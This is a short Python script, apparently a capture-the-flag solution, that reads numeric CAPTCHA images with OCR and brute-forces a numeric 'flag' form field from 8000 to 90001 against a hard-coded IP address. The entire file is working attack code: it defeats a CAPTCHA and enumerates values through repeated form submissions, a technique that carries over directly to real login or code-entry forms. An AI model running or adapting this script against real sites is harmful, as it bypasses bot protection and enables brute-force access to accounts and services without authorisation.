import requests
from PIL import Image
from io import BytesIO
import pytesseract
from bs4 import BeautifulSoup

class CaptchaSolver:
    def __init__(self, base_url, start_flag, end_flag, chall_number):
        self.base_url = base_url
        self.start_flag = start_flag
        self.end_flag = end_flag
        self.captcha_url = f"{base_url}/captcha.php"
        self.submit_url = f"{base_url}/captcha{chall_number}/"
        self.session = requests.Session()

    def get_captcha_text(self):
        response = self.session.get(self.captcha_url)
        image = Image.open(BytesIO(response.content))
        captcha_text = pytesseract.image_to_string(image, config="-c tessedit_char_whitelist=0123456789 --psm 6")
        return captcha_text.strip()

    def submit_form(self, flag, captcha_text):
        form_data = {
            'flag': flag,
            'captcha': captcha_text,
            'submit': 'Envoyer'
        }
        response = self.session.post(self.submit_url, data=form_data)
        return response.text

    def brute_force(self):
        for flag_value in range(self.start_flag, self.end_flag):
            captcha_text = self.get_captcha_text()
            if len(captcha_text) == 6:
                print(f"Trying flag value: {flag_value}")
                print("Captcha Solved as:", captcha_text)
                response_text = self.submit_form(flag_value, captcha_text)
                if "Correct" in response_text:
                    print(f"Correct flag found: {flag_value}")
                    return flag_value
        return None

    def close_session(self):
        self.session.close()

# Example usage:
solver = CaptchaSolver('http://31.220.95.27:9002', 8000, 90001, 5)
result = solver.brute_force()
if result:
    print(f"Flag {result} is correct.")
else:
    print("No valid flags found.")
solver.close_session()
